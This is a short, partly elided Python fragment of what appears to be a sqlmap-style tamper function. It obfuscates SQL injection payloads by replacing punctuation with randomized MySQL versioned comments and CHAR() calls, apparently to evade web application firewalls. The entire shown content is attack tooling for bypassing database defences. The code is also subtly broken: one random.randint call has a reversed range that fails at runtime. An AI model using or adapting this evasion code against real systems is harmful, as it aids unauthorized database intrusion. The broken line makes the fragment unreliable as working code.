...
def tamper(payload, **kwargs):
    ...
    if payload:
        ...
        char_replacements = {
            ',': f"/**{random.choice(['_','X'])}*//*!{random.randint(50000,50500)}CHAR(44)*/", # Comma -- CORRECTED HERE
            '(': f"/**{random.choice(['_','Y'])}*//*!{random.randint(50000,500)}CHAR(40)*/", # Opening parenthesis
            ')': f"/**{random.choice(['_','Z'])}*//*!{random.randint(50000,50500)}CHAR(41)*/", # Closing parenthesis
            '.': f"/**{random.choice(['_','W'])}*//*!{random.randint(50000,50500)}CHAR(46)*/", # Dot (for database.table.column)
            '=': f"/**{random.choice(['_','E'])}*//*!{random.randint(50000,50500)}CHAR(61)*/"  # Equals sign -- CORRECTED HERE
        }
